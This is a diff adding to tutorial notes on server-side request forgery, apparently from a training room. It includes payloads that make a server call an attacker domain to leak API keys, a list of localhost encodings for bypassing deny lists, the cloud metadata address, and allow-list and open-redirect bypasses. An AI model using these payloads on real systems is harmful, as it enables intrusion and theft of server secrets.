@@ -238,4 +238,60 @@ However, a malicious user may change the value of the `url` parameter in the que
 
 Suppose now, the developer alters the application such that it only needs to send the query `/item?id=123` in order to retrieve the required information. A malicious user can still perform an SSRF attack by utilising directory traversal.
 
-![SSRF example 12](./img/ssrf_eg_2.png "SSRF example 2")
+![SSRF example 2](./img/ssrf_eg_2.png "SSRF example 2")
+
+In another possible scenario, the web application may require the user to specify the subdomain to which the request is being made. For example, the user has to send the request: `http://website.thm/stock?server=api&id=123`. Then, the application crafts the request to the backend in the following manner:
+
+```
+http://<server>.website.thm/api/stock/item?id=<id>
+```
+
+For a SSRF attack, the attacker can send the request: `http://website.thm/stock?server=api.website.thm/api/user/&x=&id=123`. The web application then constructs the request to the backend as
+
+```
+http://api.website.thm/api/user?x=.website.thm/api/stock/item?id=123.
+```
+
+We see that the `&x=` in the payload turns into a query string `x=api.website.thm/api/stock/item?id=123`, which is not required by the `/user` page and is simply ignored.
+
+![SSRF example 3](./img/ssrf_eg_3.png "SSRF example 3")
+
+Going back to the very first example, the attacker can also force the web application to send a request to a server of the attacker's choice. The payload would look like `http://website.thm/stock?url=http://hacker-domain.thm`, and this may cause the application to reveal its API keys.
+
+![SSRF example 4](./img/ssrf_eg_4.png "SSRF example 4")
+
+### Finding a SSRF vulnerability
+
+Potential SSRF vulnerabilities can be spotted in web applications in many different ways. Three common places to look are:
+1. when a full URL is used as a parameter in the address bar,
+   ![Potential SSRF 1](./img/ssrf_loc_1.png "Potential SSRF 1")
+2. a hidden field in a form,
+   ![Potential SSRF 2](./img/ssrf_loc_2.png "Potential SSRF 2")
+3. partial URLs, such as hostnames or paths.
+   ![Potential SSRF 3](./img/ssrf_loc_3.png "Potential SSRF 3")
+   ![Potential SSRF 4](./img/ssrf_loc_4.png "Potential SSRF 4")
+
+When working with a blind SSRF, an external HTTP logging tool, such as [Requestbin](http://requestbin.com) or [Webhook](http://webhook.site), is useful for monitoring requests. 
+
+### Defeating common SSRF defences
+
+Two approaches to defend against SSRF are either a deny list or an allow list.
+
+**Deny list**
+
+A *deny list* is where all requests are accepted apart from resources specified a list or matching a particular pattern. A web application may employ a deny list to protect sensitive endpoints, IP addresses or domains from beign access by the public while still allowing access to to other locations. A specific endpoint to restrict access to is the localhost, which may contain server performance data or further sensitive information, so domain names such as `localhost` and `127.0.0.1` would appear on a deny list.
+
+Attackers can bypass a deny list by using alternative references to localhost such as `0`, `0.0.0.0`, `0000`, `127.1`, `127.*.*.*`, `2130706433`, `017700000001`, or subdomains with a DNS record that resolve to the IP address `127.0.0.1` (e.g. `127.0.0.1.nip.io`).
+
+In a cloud environment, it would be beneficial to block the IP address `169.254.169.254`, which contains metadata for the deployed cloud server, including possibly sensitive information. An attacker can bypass this by registering a subdomain on their own domain with a DNS record that points to the IP address `169.254.169.254`.
+
+**Allow list**
+
+An *allow list* is where all requests get denied unless they appear on a list or match a particular pattern, e.g. the URL used in a parameter must start with `https://website.thm`. An attacker can quickly circumvent this rule by creating a subdomain on their own domain name like `https://wesite.thm.attackers-domain.thm`. This would then cause the application logic to allow the input and let the attacker control the internal HTTP request. 
+
+**Open redirect**
+
+If the above bypasses do not work, there is one more trick that an attacker can use -- the *open redirect*. An open redirect is an endpoint on the server where the website visitor gets automatically redirected to another website address. 
+
+For example, the link `https://website.thm/link?url=https://tryhackme.com` may be used to record the number of times visitors have clicked on the link for advertising/marketing purposes. If there was a potential SSRF vulnerability with stringent rules which only allowed URLs beginning with `https://website.thm`, then an attacker could utilise the above feature to redirect the internal HTTP request to a domain of the attacker's choice.
+
